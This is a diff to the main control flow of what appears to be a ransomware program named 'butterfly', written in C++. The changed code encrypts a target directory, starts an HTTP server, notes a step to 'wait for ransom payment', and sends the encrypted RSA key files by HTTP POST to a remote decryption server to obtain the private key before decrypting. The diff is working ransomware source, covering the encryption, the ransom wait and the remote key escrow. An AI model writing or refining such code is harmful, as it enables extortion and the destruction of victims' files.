@@ -103,21 +103,43 @@ void Butterfly::run()
         encryptor->invokeDir(_args.dir, _args.protection);
 
         // After encryption start http server, gui or wallpaper
-        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8081);
-        //server->registerMasterPKeyCB(std::bind(&hybrid::Decryptor::invokeDir, decryptor, std::placeholders::_1));
-        server->run();
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
+        server->run(); //TODO: Create thread for HTTPServer
 
         // Wait for ransom payment
+        //TODO: Wait for ransom payment
 
-        // Create HTTP Post Request to bflyServerApp to get the decrypted CPrivateRSA.pem string
+        // Load encrypted files CPrivateRSA.bin and RSA.bin as hex strings
         std::string cprivateRSAFileHex, rsaFileHex;
         loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
 
+        // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
+        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient());
 
-        // Start decryption
-        std::shared_ptr<butterfly::hybrid::Decryptor> decryptor = std::make_shared<butterfly::hybrid::Decryptor>();
-        //decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
-        decryptor->invokeDir(_args.dir);
+        // Create the correct formParam string with mandatory param:value pairs
+        _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
+                                                   std::make_pair(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex),
+                                                   std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
+        std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
+
+        // Send the http post request to the REMOTE_DECRYPTION_URL
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+
+        if ( httpClient->statusCode == 200 )
+        {
+            // Decryptor instance to invoke the directory for the decryption process
+            std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+            decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
+            decryptor->invokeDir(_args.dir);
+        } else
+        {
+            #ifdef LOGGING
+            LOG_ERROR("Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase);
+            #else
+            std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
+            #endif
+        }
+
     }
     // Start only Encryption
     else if ( !_args.encrypt.empty() )
@@ -128,11 +150,12 @@ void Butterfly::run()
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
     }
-    // Start decryption with the remote decrypted file
+    // Start only Decryption with the remote decrypted file
     else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
     {
         std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;
 
+        // Load encrypted files CPrivateRSA.bin and RSA.bin as hex strings
         std::string cprivateRSAFileHex, rsaFileHex;
         loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
 
@@ -140,14 +163,24 @@ void Butterfly::run()
         checkInternetConnection();
 
         // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(butterfly::params::REMOTE_DECRYPTION_URL_PORT));
-        httpClient->setFormParam(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex);
-        httpClient->setFormParam(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex);
-        httpClient->setFormParam("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE));
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL);
+        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient());
+
+        // Create the correct formParam string with mandatory param:value pairs
+        _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
+                                                             std::make_pair(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex),
+                                                             std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
+        std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
+
+        // Send the http post request to the REMOTE_DECRYPTION_URL
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
 
         if ( httpClient->statusCode == 200 )
         {
+            #ifdef LOGGING
+            LOG_INFO("Successfully decrypted the CPrivateRSA.bin file on the remote server!");
+            #else
+            std::cout << "Successfully decrypted the CPrivateRSA.bin file on the remote server!" << std::endl;
+            #endif
             // Decryptor instance to invoke the directory for the decryption process
             std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
             decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
@@ -160,7 +193,6 @@ void Butterfly::run()
             std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
             #endif
         }
-
 
     }
     // Start Decryption with provided key
